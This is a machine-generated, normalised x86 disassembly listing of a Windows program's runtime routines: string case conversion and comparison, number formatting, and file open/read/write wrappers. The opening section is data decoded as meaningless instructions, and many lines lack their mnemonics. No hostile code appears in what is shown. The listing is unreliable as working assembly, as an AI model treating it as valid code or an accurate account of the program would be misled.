add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax 0x72615645
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] cl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
inc eax
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
rcl [ eax + 0x76 ] 0x40
add [ eax ] al
add [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x50 ]
jb r-xdata
pushfd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] ch
inc eax
add [ eax ] dl
add [ eax ] al
add ah bl
insd
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x77
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
mov al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx ] cl
inc ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
ja r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
sbb [ ecx ] dh
inc eax
add [ esi ] cl
push 0x4077
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + eax ] cl
xchg esp eax
adc [ eax ] al
outsd
jb r-xdata
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al [ ebp + 0x53 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edi + 0x40 ] 0x0
or al 0x0
inc ebp
jb r-xdata
adc [ ebp + 0x41 ] al
jae r-xdata
or al 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] dh
je r-xdata
js r-xdata
push ebp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add al al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
or edx [ ebx ]
add [ ebx + 0x6fe9d4c0 ] al
push ebx
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
insb
jae r-xdata
add eax 0xffffffd4
jmp sub_40cab0
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x130040c8 ] al
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] dl
inc ebp
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jmp sub_40559c
add [ eax + eax ] al
add [ eax + 0x70004010 ] ah
inc eax
add [ eax ] al
add [ eax ] al
je r-xdata
imul ebp [ edi + 0x6e ] 0x4077d890
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar ah 0x77
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4078c83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
jns r-xdata
jb r-xdata
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add ah bl
xor [ eax ] al
or al 0x40
add [ ebx ] dl
je r-xdata
adc [ ecx + 0x46a13415 ] cl
add [ ebx + 0x46ae4815 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add ah bl
xor [ eax ] al
and al 0xca
add ah ah
js r-xdata
xor eax [ eax ]
jl r-xdata
add eax 0xffffffd4
jmp sub_40cb9c
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
je r-xdata
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ edx + ecx * 8 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] dl
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33700040 ] dl
inc eax
add [ edx * 2 + 0x55400040 ] dh
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x55 ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
sar bh 0xff
lodsb [ esi ]
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
xor al 0xa1
inc esi
add [ ebx + 0x34158910 ] cl
mov eax [ 0x158b0046 ]
dec eax
scasb [ edi ]
inc esi
arpl [ eax + 0x72 ] bp
outsd
sub_407978
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407994
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
pop edi
pop esi
pop ebx
retn
sub_4079b8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b3c
mov eax esi
pop esi
pop ebx
retn
sub_4079d8
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407a04
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4079d8
pop ebx
retn
sub_407a3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404138
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044c4
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407a78
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404138
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044c4
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407ab4
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407ae4
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407b04
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407b58
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407b04
test eax eax
jne r-xdata
sub_407b7c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404138
mov ebx eax
mov eax esi
call sub_404338
mov edx eax
mov eax edi
mov ecx ebx
call sub_403f68
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407bb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404138
mov ebx eax
mov eax esi
call sub_404338
mov edx eax
mov eax edi
mov ecx ebx
call sub_403f68
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407be4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404138
push eax
mov eax esi
call sub_404338
push eax
mov eax ebx
call sub_404138
push eax
mov eax ebx
call sub_404338
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404138
push eax
mov eax esi
call sub_404338
push eax
mov eax ebx
call sub_404138
push eax
mov eax ebx
call sub_404338
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c6c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407c8c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404138
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403e78
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404398
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407cdc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404138
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404138
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407d40
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407d56
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407d56
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d56
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d8c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407d40
mov edx esi
pop eax
call sub_403f68
add esp 0x10
pop esi
retn
sub_407dac
or cl cl
jne sub_407de0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407de0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407de0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407de0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e78
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407dac
mov edx esi
pop eax
call sub_403f68
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407ea0
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407d40
mov edx esi
pop eax
call sub_403f68
add esp 0x20
pop esi
retn
xor edx edx
sub_407ec8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b5c
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407994
sub_407f1c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b5c
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407f3c
mov eax [ rw-data ]
call sub_404c40
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404c40
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404dfc
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ecc
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404dfc
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ecc
sub_407fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407c54
test al al
je r-xdata
sub_408008
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409210
mov edx eax
test dl dl
je r-xdata
call sub_407f3c
push ebp
mov eax [ rw-data ]
call sub_404c48
mov edx eax
mov eax [ rw-data ]
call sub_407fcc
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404c48
mov edx eax
mov eax [ rw-data ]
call sub_407fcc
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4080a4
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ecc
call sub_407f3c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ecc
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ecc
jmp r-xdata
pop esi
pop ebx
retn
sub_4080f0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404338
push eax
call CreateFileA
sub_408148
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404338
push eax
call CreateFileA
pop ebx
retn
sub_408174
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4081a0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4081cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40820c
push ebx
push esi
mov esi eax
mov eax esi
call sub_404138
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bcb8
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40823c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404138
mov edi eax
mov eax ebx
call sub_404338
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408540
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bcb8
cmp al 0x2
jne r-xdata
dec edi
sub_40828c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40823c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404398
pop edi
pop esi
pop ebx
retn
sub_4082c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40823c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403e78
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404398
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40830c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404338
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403f68
add esp 0x108
pop esi
pop ebx
retn
sub_408348
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c1c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c1c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4083f8
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408420
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408454
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404138
push eax
mov eax ebx
call sub_404338
mov edx eax
mov eax esi
pop ecx
call sub_408420
pop esi
pop ebx
retn
sub_408478
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404338
mov edx eax
mov ecx edi
mov eax ebx
call sub_408420
pop edi
pop esi
pop ebx
retn
sub_408498
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4084bc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4084fc
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408554
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4085c8
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4083bc
mov esi eax
inc esi
mov eax esi
call sub_4085a8
mov ecx esi
mov edx ebx
call sub_4083e8
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408604
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bcdc
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4083e8
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407994
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40868c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
